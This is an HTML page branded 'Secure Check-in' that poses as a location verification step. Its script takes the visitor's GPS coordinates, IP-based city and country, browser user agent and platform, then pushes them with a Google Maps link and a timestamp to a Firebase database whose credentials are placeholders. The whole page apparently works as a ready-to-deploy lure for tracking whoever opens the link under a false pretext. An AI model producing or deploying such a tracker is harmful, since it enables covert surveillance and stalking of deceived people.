<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Location Check-in</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">

<style>
body {
  margin:0;
  font-family:'Inter', sans-serif;
  background:#f4f6fb;
}

.container {
  max-width:400px;
  margin:60px auto;
  background:#fff;
  border-radius:16px;
  padding:25px;
  box-shadow:0 10px 25px rgba(0,0,0,0.1);
  text-align:center;
}

.logo {
  font-size:22px;
  font-weight:600;
  color:#4f46e5;
}

p {
  color:#555;
  font-size:14px;
}

button {
  width:100%;
  padding:14px;
  margin-top:15px;
  background:#4f46e5;
  color:#fff;
  border:none;
  border-radius:10px;
  font-size:16px;
  cursor:pointer;
}

button:hover {
  background:#4338ca;
}

#status {
  margin-top:15px;
  font-size:13px;
}
</style>
</head>

<body>

<div class="container">
  <div class="logo">Secure Check-in</div>
  <p>We use your location for verification & service access.</p>

  <button onclick="getLocation()">Continue</button>

  <div id="status"></div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "YOUR_KEY",
  authDomain: "YOUR_DOMAIN",
  databaseURL: "YOUR_DB",
  projectId: "YOUR_ID"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

window.getLocation = async function(){
  document.getElementById("status").innerHTML="Checking permission...";

  navigator.geolocation.getCurrentPosition(async (pos)=>{
    let lat = pos.coords.latitude;
    let lon = pos.coords.longitude;

    let ipData = await fetch("https://ipapi.co/json/").then(r=>r.json());

    push(ref(db,"users"),{
      latitude:lat,
      longitude:lon,
      map:`https://maps.google.com/?q=${lat},${lon}`,
      device:navigator.userAgent,
      platform:navigator.platform,
      city:ipData.city,
      country:ipData.country_name,
      time:new Date().toString()
    });

    document.getElementById("status").innerHTML="Verification complete ✅";
  }, ()=>{
    document.getElementById("status").innerHTML="Permission denied ❌";
  });
}
</script>

</body>
</html>
